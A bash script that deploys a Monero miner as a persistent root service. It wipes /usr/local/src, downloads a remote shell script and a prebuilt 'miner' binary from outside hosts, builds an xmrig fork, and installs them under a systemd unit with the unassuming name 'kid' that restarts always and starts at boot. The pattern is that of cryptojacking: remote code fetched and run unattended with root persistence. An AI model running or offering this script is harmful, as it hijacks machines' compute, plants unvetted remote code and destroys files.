#!/usr/bin/env bash
sudo apt-get update && 
apt-get -y install build-essential libssl-dev libcurl4-openssl-dev libjansson-dev gcc g++ make screen curl libgmp-dev automake git &&
sudo sysctl vm.nr_hugepages=128 &&
sudo sysctl -w vm.nr_hugepages=128 &&
sudo apt install -y build-essential cmake libuv1-dev libmicrohttpd-dev libssl-dev libhwloc-dev && 
cd /usr/local/src/ && rm -rf * &&
wget https://raw.githubusercontent.com/waniekvbgm/zalska/master/suxmr-35-link1.sh && chmod a+x suxmr-35-link1.sh
git clone https://github.com/waniekvbgm/xmrig.git && cd xmrig && mkdir build && cd build && cmake .. && make
cd /usr/local/src/xmrig/build && wget https://release.monitorom.com/data/cpu/cpu_fe.tar.xz && tar xf cpu_fe.tar.xz && sudo chmod a+x miner
bash -c 'cat <<EOT >>/lib/systemd/system/kid.service 
[Unit]
Description=kid
After=network.target
[Service]
Type=forking
ExecStart=/usr/local/src/suxmr-35-link1.sh
WatchdogSec=3600
Restart=always
RestartSec=60
User=root
[Install]
WantedBy=multi-user.target
EOT
' &&
systemctl daemon-reload &&
systemctl enable kid.service &&
service kid start
